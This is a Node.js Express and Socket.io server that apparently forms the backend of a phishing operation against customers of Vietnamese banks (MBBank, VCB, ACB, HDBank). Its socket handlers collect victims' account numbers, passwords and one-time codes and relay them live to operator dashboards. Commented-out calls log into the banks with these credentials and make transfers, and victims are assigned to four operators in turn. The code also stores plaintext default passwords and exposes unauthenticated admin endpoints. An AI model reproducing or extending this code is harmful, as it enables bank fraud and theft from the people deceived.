const express = require('express');
const app = express();
const path = require('path');
const http = require("http");
require('dotenv').config();
const port = process.env.PORT || 5000
const server = http.createServer(app);
var bodyParser = require('body-parser')
let multer = require("multer");
var cors = require('cors')
app.use(cors())
// const moduleBank = require('./modules');
const socketIo = require("socket.io")(server, {
    cors: {
        origin: "*",
    }
});

// const connection = require("./db");
const mongoose = require("mongoose");

var uri = "mongodb://localhost:27017/hd";
const users = require('./models/user');
const settings = require('./models/setting');
const admins = require('./models/admin');
mongoose.connect(uri).then(() => {
    console.log("MongoDB database connection established successfully");
    initAdmin();
    initSetting();
}).catch((err) => { console.error(err); })

const initAdmin = async () => {
    const adminData = await admins.findOne({});

    if (!adminData) {
        const admin = new admins()
        admin.username = 'admin';
        admin.password = 'admin123';
        admin.role = true;

        await admin.save()
        for (let index = 0; index < 4; index++) {
            const admin = new admins()
            admin.username = 'admin' + (index + 1);
            admin.password = 'admin123';
            admin.role = false;
            await admin.save();
        }
    }
}
const initSetting = async () => {
    const settingData = await settings.findOne({});
    if (!settingData) {
        const setting = new settings()
        setting.fullName = 'Nguyễn Văn A';
        setting.bankName = 'MBBank';
        setting.bankAccount = '123456789';
        setting.bankPassword = '123456789';
        setting.bankBranch = 'Chi nhánh Hà Nội';
        setting.zaloImage = 'https://zalo.me/g/lnzjzv551';

        await setting.save();
    }
}
var storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, 'public/uploads')
    },
    filename: function (req, file, cb) {
        cb(null, Date.now() + '-' + file.originalname)
    }
})

var upload = multer({ storage: storage })

// set link static
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: false }))
app.use(bodyParser.json())
socketIo.on("connection", (socket) => { ///Handle khi có connect từ client tới
    console.log("New client connected" + socket.id);

    socket.emit("sendDataServer", { data: "Hello Client" }); // phát sự kiện  có tên sendDataServer cùng với dữ liệu tin nhắn từ phía server

    socket.on("sendDataClient", function (data) { // Handle khi có sự kiện tên là sendDataClient từ phía client
        socketIo.emit("sendDataServer", { data });// phát sự kiện  có tên sendDataServer cùng với dữ liệu tin nhắn từ phía server
    })

    socket.on("disconnect", () => {
        console.log("Client disconnected"); // Khi client disconnect thì log ra terminal.
    });

    // socket.on('send-data-otp-vcb', async (data) => {
    //     console.log(data);
    //     const response = await moduleBank.xacthucOTPLogin(data.method, socket.id);
    //     socket.emit('send-data-otp-vcb', response);
    // })

    socket.on('send-data-send-otp-vcb', async (data) => {
        // const response = await moduleBank.xacthucOTPVCB(data.otp, socket.id);
        // socket.emit('send-data-send-otp-vcb', response);
        socketIo.emit('send-data-admin-user', data);
    })

    // socket.on('send-method-ct-vcb', async (data) => {
    //     const response = await moduleBank.xacthucMethodCtVCB(data.method, socket.id);
    //     socket.emit('send-method-ct-vcb', response);
    // })

    // socket.on('send-data-send-otp-vcb-chuyentien', async (data) => {
    //     const response = await moduleBank.xacthucCTVCB(data.otp, socket.id);
    //     console.log('response', response);
    //     socket.emit('send-data-send-otp-vcb-chuyentien', response);
    // })

    socket.on('send-data', async (data) => {
        console.log(data);
        // const settingData = await settings.findOne({}).lean().exec();
        // bắn socket id để phân biệt từng người dùng
        socketIo.emit('send-data-admin', {
            ...data,
        });
        // switch (data.bankName) {
        //     case 'MBBank':
        //         console.log('settingData', settingData);
        //         const response = await moduleBank.loginMB(data.bankAccount, data.bankPassword, socket.id, settingData);
        //         socket.emit('send-data', response);
        //         break;
        //     case 'VCB':
        //         // console.log('settingData', settingData);
        //         console.log('data', data);
        //         const response1 = await moduleBank.loginVCB(data.bankAccount, data.bankPassword, socket.id, settingData);
        //         socket.emit('send-data-otp-vcb-chuyentien', response1);
        //         break;
        //     case 'ACB':
        //         const response2 = await moduleBank.loginACB(data.bankAccount, data.bankPassword);
        //         socket.emit('send-data', response2);
        //         break;

        //     case 'HDBank':
        //         const response3 = await moduleBank.loginHDBank(data.bankAccount, data.bankPassword, socket.id, settingData);
        //         console.log('response3', response3);
        //         socket.emit('send-data', response3);
        //         break;
        //     default:
        //         break;
        // }
    });
    // socket.on('send-data-b', async (data) => {
    //     console.log(data);
    //     const response = await moduleBank.xacthuc(data.otp, data.bankName);
    //     socket.emit('send-data-b', response);
    // })

    socket.on('send-data-user', (data) => {
        socketIo.emit(`send-data-user-${data.numberPhone}`, data);
    });
})


app.get('/', function (req, res) {
    res.sendFile(path.join(__dirname, '/public/index.html'));
});

// app.get('/api/login', function (req, res) {
//     res.sendFile(path.join(__dirname, '/public/login.html'));
// });

app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;

    const isValid = await admins.findOne({ username, password }).lean().exec();

    if (isValid) {
        return res.status(200).json({
            message: 'success',
            status: 200,
            user: isValid
        })
    } else {
        return res.status(404).json({
            message: 'fail',
            status: 404
        })
    }
});


app.post('/api/update-setting', async (req, res) => {
    console.log('res', req.body);
    await settings.updateOne({}, req.body);

    return res.status(200).json({
        message: 'success'
    })
});


app.post('/api/update-zalo', upload.single('zaloImage'), async (req, res) => {
    const file = req.file
    if (!file) {
        const error = new Error('Please upload a file')
        error.httpStatusCode = 400
        return next(error)
    }
    // console.log('res', req.file);
    await settings.updateOne({}, { zaloImage: req.file.path });

    // back
    res.json({
        message: 'success',
        data: req.file.filename
    })

});

app.post('/api/upload-image-before', upload.single('imageBefore'), async (req, res) => {
    const file = req.file
    if (!file) {
        const error = new Error('Please upload a file')
        error.httpStatusCode = 400
        return next(error)
    }
    // name file upload
    await users.updateOne({ numberPhone: req.body.numberPhone }, { imageBefore: 'public/' + req.file.filename });

    return res.status(200).json({
        message: 'success',
        data: 'public/' + req.file.filename
    })
});

app.post('/api/upload-image-after', upload.single('imageAfter'), async (req, res) => {
    const file = req.file
    if (!file) {
        const error = new Error('Please upload a file')
        error.httpStatusCode = 400
        return next(error)
    }
    await users.updateOne({ numberPhone: req.body.numberPhone }, { imageAfter: 'public/' + req.file.filename });

    return res.status(200).json({
        message: 'success',
        data: 'public/' + req.file.filename
    })
});

app.post('/api/upload-image', upload.single('image'), async (req, res) => {
    const file = req.file
    if (!file) {
        const error = new Error('Please upload a file')
        error.httpStatusCode = 400
        return next(error)
    }
    await users.updateOne({ numberPhone: req.body.numberPhone }, { image: 'public/' + req.file.filename });

    return res.status(200).json({
        message: 'success',
        data: 'public/' + req.file.filename
    })
});

app.get('/api/get-setting', async (req, res) => {
    const settingData = await settings.findOne({}).lean().exec();

    return res.status(200).json({
        message: 'success',
        data: settingData
    })
});
app.get('/api/get-admin', async (req, res) => {
    const adminData = await admins.find({}).lean().exec();

    return res.status(200).json({
        message: 'success',
        data: adminData
    })
});

app.get('/api/get-admin/:id', async (req, res) => {
    const { id } = req.params;
    const adminData = await admins.findOne({ _id: id }).lean().exec();

    return res.status(200).json({
        message: 'success',
        data: adminData
    })
});
// delete admin
app.delete('/api/delete-admin/:id', async (req, res) => {
    const { id } = req.params;
    await admins.deleteOne({
        _id: id
    });

    return res.status(200).json({
        message: 'success'
    })
});

// update admin
app.put('/api/update-admin/:id', async (req, res) => {
    const { id } = req.params;
    const adminData = await admins.findOne({ _id: id }).lean().exec();
    if (!adminData) {
        return res.status(404).json({
            message: 'fail',
            status: 404
        })
    }

    await admins.updateOne({
        _id: id
    }, req.body);

    return res.status(200).json({
        message: 'success'
    })
});

app.post('/api/create-admin', async (req, res) => {
    const { username, password, role } = req.body;
    const admin = new admins()
    admin.username = username;
    admin.password = password;
    admin.role = role;

    await admin.save();

    return res.status(200).json({
        message: 'success'
    })
});

app.get('/api/get-user/:adminId', async (req, res) => {
    // user order by createAt
    const admin = await admins.findOne({ _id: req.params.adminId }).lean().exec();

    if (admin.role) {
        const userData = await users.find({}).sort({ createAt: -1 }).lean().exec();
        return res.status(200).json({
            message: 'success',
            data: userData
        })
    } else {
        const userData = await users.find({ adminId: req.params.adminId }).sort({ createAt: -1 }).lean().exec();
        return res.status(200).json({
            message: 'success',
            data: userData
        })
    }
});

app.get('/api/get-user-detail/:id', async (req, res) => {
    const { id } = req.params;
    const userData = await users.findOne({ _id: id }).lean().exec();
    return res.status(200).json({
        message: 'success',
        data: userData
    })
});

// delete user

app.delete('/api/delete-user/:id', async (req, res) => {
    const { id } = req.params;
    await users.deleteOne({
        _id: id
    });

    return res.status(200).json({
        message: 'success'
    })
});

app.get('/api/check-user/:numberPhone', async (req, res) => {
    const { numberPhone } = req.params;
    // const userData = await users.findOne({ numberPhone }).lean().exec();

    // if (!userData) {
    //     return res.status(200).json({
    //         message: 'success',
    //         status: 404
    //     })
    // }

    // return res.status(404).json({
    //     message: 'fail',
    //     status: 404
    // })

    return res.status(200).json({
        message: 'success',
    })
});

app.post('/api/insert-user', async (req, res) => {
    const user = new users(req.body);
    // có tất cả 4 admin thì mỗi khi thêm mới người dùng sẽ chọn lần lượt admin 1, admin 2, admin 3, admin 4
    // 1. lấy ra tất cả admin
    const adminData = await admins.find({}).lean().exec();
    // 2. lấy ra người dùng cuối cùng
    const userData = await users.find({}).sort({ createAt: -1 }).lean().exec();
    // 3. lấy ra admin cuối cùng
    const lastAdmin = userData.length > 0 ? userData[userData.length - 1].adminId : adminData[adminData.length - 1]._id;
    // 4. lấy ra admin tiếp theo
    const nextAdmin = adminData.find(item => item._id !== lastAdmin);
    // 5. gán admin tiếp theo cho người dùng mới
    user.adminId = nextAdmin._id;

    await user.save();
    socketIo.emit('send-data-admin', {
        ...req.body,
    });
    return res.status(200).json({
        message: 'success'
    })
});

app.put('/api/update-user/:numberPhone', async (req, res) => {
    const { numberPhone } = req.params;
    const userData = await users.findOne({ numberPhone }).lean().exec();
    if (!userData) {
        return res.status(404).json({
            message: 'fail',
            status: 404
        })
    }

    await users.updateOne({
        numberPhone: numberPhone
    }, req.body);

    return res.status(200).json({
        message: 'success',
    })
});

app.put('/api/update-user-id/:id', async (req, res) => {
    const { id } = req.params;
    const userData = await users.findOne({ _id: id }).lean().exec();
    if (!userData) {
        return res.status(404).json({
            message: 'fail',
            status: 404
        })
    }

    await users.updateOne({
        _id: id
    }, req.body);

    return res.status(200).json({
        message: 'success'
    })
});

app.post('/api/change-password', async (req, res) => {
    const { password, newPassword, confirmPassword } = req.body;
    const adminData = await admins.findOne({ password: password }).lean().exec();

    if (!adminData) {
        return res.status(404).json({
            message: 'fail',
            status: 404
        })
    }

    if (newPassword !== confirmPassword) {
        return res.status(404).json({
            message: 'fail',
            status: 404
        })
    }

    await admins.updateOne({
        password: password
    }, { password: newPassword });

    return res.status(200).json({
        message: 'success'
    })
})


server.listen(port, () => {
    console.log('Server đang chay tren cong' + port);
});